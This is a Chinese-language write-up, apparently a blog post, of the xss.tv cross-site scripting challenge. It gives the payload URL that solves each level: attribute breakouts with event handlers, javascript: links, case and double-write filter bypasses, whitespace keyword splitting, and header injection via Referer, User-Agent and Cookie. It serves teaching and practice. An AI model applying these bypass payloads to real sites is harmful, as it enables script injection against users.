---
mathjax: false
title: xss.tv挑战赛
date: 2018-04-05 23:47:33
---

> http://test.xss.tv
>
> http://47.94.13.75/test/

`test on Firefox  54.0 (64-bit)` 

# Level1

```javascript
view-source:http://47.94.13.75/test/level1.php?name=test
<h2 align=center>欢迎用户test</h2>
直接在文本中输出用户提交的变量
http://47.94.13.75/test/level1.php?name=<script>alert()</script>

收获：为HTML body添加标签。
```

# Level2


```javascript
view-source:http://47.94.13.75/test/level2.php?keyword=test
<input name=keyword  value="test">
直接在标签属性中用户提交的变量
http://47.94.13.75/test/level2.php?keyword="><script>alert()</script>

收获：闭合标签属性的双引号、闭合标签并在标签外添加script标签。
```

# Level3


```javascript
view-source:http://47.94.13.75/test/level3.php?keyword=';!-"<findneo>={()}/\%26
<h2 align=center>没有找到和';!-&quot;&lt;findneo&gt;={()}/\&amp;相关的结果.</h2>
<input name=keyword  value='';!-&quot;&lt;findneo&gt;={()}/\&amp;'>

两处输出都对双引号、尖括号和&进行了HTML实体编码，但前面的单引号可以被闭合，考虑使用input标签的某些事件执行脚本。
自动聚焦到输入框，打开就弹
http://47.94.13.75/test/level3.php?keyword=' onfocus='alert()' autofocus='
点击页面非输入框的任何地方以移开焦点
http://47.94.13.75/test/level3.php?keyword='  autofocus onblur='alert()
点击输入框
http://47.94.13.75/test/level3.php?keyword=' onfocus='alert()
http://47.94.13.75/test/level3.php?keyword='  onclick='alert()
在输入框输入
http://47.94.13.75/test/level3.php?keyword=' oninput='alert()
输入然后点击搜索
http://47.94.13.75/test/level3.php?keyword=' onchange='alert()
移动鼠标经过输入框
http://47.94.13.75/test/level3.php?keyword=' onmousemove='alert()
http://47.94.13.75/test/level3.php?keyword=' onmouseout='alert()
http://47.94.13.75/test/level3.php?keyword=' onmouseover='alert()
点击输入框，进行按键操作
http://47.94.13.75/test/level3.php?keyword=' onkeydown='alert()
http://47.94.13.75/test/level3.php?keyword=' onkeyup='alert()
http://47.94.13.75/test/level3.php?keyword=' onkeypress='alert()
双击输入框
http://47.94.13.75/test/level3.php?keyword='  ondblclick='alert()

更多可用事件可以参考这里：https://www.w3schools.com/tags/ref_eventattributes.asp

收获：闭合标签属性的单引号并在标签中添加事件。
```

# Level4


```javascript
view-source:http://47.94.13.75/test/level4.php?keyword=';!-"<findneo>={()}/\%26
<h2 align=center>没有找到和';!-&quot;&lt;findneo&gt;={()}/\&amp;相关的结果.</h2>
<input name=keyword  value="';!-"findneo={()}/\&">

在文本中编码了双引号、尖括号和&，在标签属性值中过滤了尖括号。
把上一题payload的单引号换成双引号应该都可以用
http://47.94.13.75/test/level4.php?keyword=" onfocus='alert()' autofocus="

收获：闭合标签属性的双引号并在标签中添加事件。
```

# Level5


```javascript
view-source:http://47.94.13.75/test/level5.php?keyword=';!-"<findneo>={()}/\%26
<h2 align=center>没有找到和';!-&quot;&lt;findneo&gt;={()}/\&amp;相关的结果.</h2>
<input name=keyword  value="';!-"<findneo>={()}/\&">

在文本中编码了双引号、尖括号和&，标签属性值没有编码
进一步测试发现query会转成小写，<script，on等敏感词会加下划线
看起来事件和script标签都不好使，可以闭合原来的标签，自己添加标签，然后试着用用刚从书里学到的伪协议
点击findneo就能弹
http://47.94.13.75/test/level5.php?keyword="><a href="javascript:alert(1);">findneo</a>
做一下美化
http://47.94.13.75/test/level5.php?keyword=" type="hidden"/><a href="javascript:alert(1);">aa</a><input type="hidden
vbscript和dataURI似乎都不能奏效。

收获：利用JavaScript伪协议。
```

# Level6

```javascript
http://47.94.13.75/test/level6.php?keyword=';!-"<findneo>={()}/\%26

<h2 align=center>没有找到和';!-findneo={()}/\相关的结果.</h2>

<input name=keyword  value="';!-"<findneo>={()}/\&">

在文本中编码了双引号、尖括号和&，标签值属性没有编码

进一步测试发现<script,on,href都被加下划线了，但是没有做全部转小写的操作，所以可以大小写绕过。

http://47.94.13.75/test/level6.php?keyword="><Script>alert()</script>

收获：大小写绕过敏感词检测。
```

# Level7

````javascript
view-source:http://47.94.13.75/test/level7.php?keyword=';!-"<findneo>={()}/\%26
<h2 align=center>没有找到和';!-&quot;&lt;findneo&gt;={()}/\&amp;相关的结果.</h2>
<input name=keyword  value="';!-"<findneo>={()}/\&">

在文本中编码了双引号、尖括号和&，标签值属性没有编码
进一步测试发现on,script,href都被替换为空，但只执行一次，没有递归操作，可以用关键字嵌套来绕过。
http://47.94.13.75/test/level7.php?keyword="><soncript>alert()</soncript>

收获：关键字嵌套（双写）绕过敏感词过滤。
````

# Level8


```javascript
view-source:http://47.94.13.75/test/level8.php?keyword=';!-"<findneo>={()}/\%26
<input name=keyword  value="';!-&quot;&lt;findneo&gt;={()}/\&amp;">
<a href="';!-&quot<findneo>={()}/\&">友情链接</a>

input标签的value属性输出处编码了双引号、尖括号和&；a标签的href属性输出处编码了双引号。
进一步测试发现数据都被转小写，on,script,href,data等都被加下划线了。
一番查找资料发现了可以通过JavaScript变换（利用空白符如水平制表符HT，换行符LF，回车键CR来截断关键字）的办法绕过
http://47.94.13.75/test/level8.php?keyword=javas%09cript:alert()
http://47.94.13.75/test/level8.php?keyword=javas%0acript:alert()
http://47.94.13.75/test/level8.php?keyword=javas%0dcript:alert()

可在http://wps2015.org/drops/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html
页面内搜索“JavaScript变换”看到相关信息。

收获：空白符（特殊的结束标识符）绕过敏感词检测。
```

# Level9


```javascript
view-source:http://47.94.13.75/test/level9.php?keyword=http://';!-"<finDneo>={()}/\&
<input name=keyword  value="http://';!-&quot;&lt;findneo&gt;={()}/\&amp;">
</center><center><BR><a href="http://';!-&quot<findneo>={()}/\&">友情链接</a>

输入数据全部转为小写，且必须协议正确，刚开始以为必须以“http://”开头，后来发现只要含有就可以了。
input标签的值编码了双引号、尖括号和&；href处编码了双括号。
从上一题稍作变化即可
http://47.94.13.75/test/level9.php?keyword=javas%09cript:alert('http://')

收获：如果要检测URL协议，应该检测协议名是否在字符串的开头。
```

# Level10


```javascript
view-source:http://47.94.13.75/test/level10.php?keyword=';!-"<findneo>={()}/\%26
<h2 align=center>没有找到和';!-&quot;&lt;findneo&gt;={()}/\&amp;相关的结果.</h2>
只有一个输出点，编码了双引号、尖括号和&。谷歌了很久，都说这几乎是不可能成的。（If angle brackets and double quote characters are escaped, this is enough to prevent XSS in HTML body and double quoted entity value contexts.）
无奈之下查了writeup，发现自己观察能力需要提高，显著的hidden就在眼皮底下，竟然一点都没有注意到。
有一个隐藏的表单如下：
<form id=search>
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
</form>
可尝试其参数是否可能被注入
访问47.94.13.75/test/level10.php?keyword=asdf&t_link="&t_history="&t_sort="
会发现在相应中t_sort是可注入双引号的，于是可以构造链接弹窗。
http://47.94.13.75/test/level10.php?t_sort="  autofocus onfocus=alert() type="text

收获：注意测试隐藏元素。
这道题乍一看有些让人摸不着头脑，但仔细想想觉得这在真实环境中是会发生的。开发者利用隐藏的表单提交数据，然后就默认这些数据是可靠的，于是在忘记或者认为没必要在服务端做校验，这就导致了代码的缺陷。像本题的t_sort键就是个例子，所以如果遇到hidden的元素可以测一测。
```

# Level11


```javascript
test1:view-source:http://47.94.13.75/test/level11.php?keyword=&t_link="<xss>&t_history="<xss>&t_sort='<xss>&t_ref="<xss>
与上一题类似，表单中多了一个t_ref，但看起来只有t_sort可以注入。
test2:view-source:http://47.94.13.75/test/level11.php?t_sort=';!-"<findneo>={()}/\%26
得到：<input name="t_sort"  value="';!-&quot;&lt;findneo&gt;={()}/\&amp;" type="hidden">
对双引号、尖括号和&进行了编码。input标签中value属性的双引号难以逃逸。
考虑莫名多出来的t_ref,猜测服务端是取请求头的referer值来返回，于是截包添加请求头。
referer: " autofocus onfocus=alert() type="text

收获：寻找一些可能的、可控的输入！
```

# Level12


```javascript
view-source:http://47.94.13.75/test/level12.php?keyword=findneo
与上一题相似，这题修改的是UA。

收获：User-Agent（以及HTTP请求头的其他部分）也是可控的输入。
```

# Level13


```javascript
view-source:http://47.94.13.75/test/level13.php?keyword=findneo
与前面类似，修改Cookie。

收获：Cookie（以及HTTP请求头的其他部分）也是可控的输入。
```

# Level16

```javascript
http://47.94.13.75/test/level16.php
测试发现编码了/和空格
将后面内容注释掉，使用无需闭合的标签，使用特殊空白符代替空格即可
http://47.94.13.75/test/level16.php?keyword=findneo<img%0asrc=''%0aonerror=alert(1)><!--

收获：注释符，空白符
```
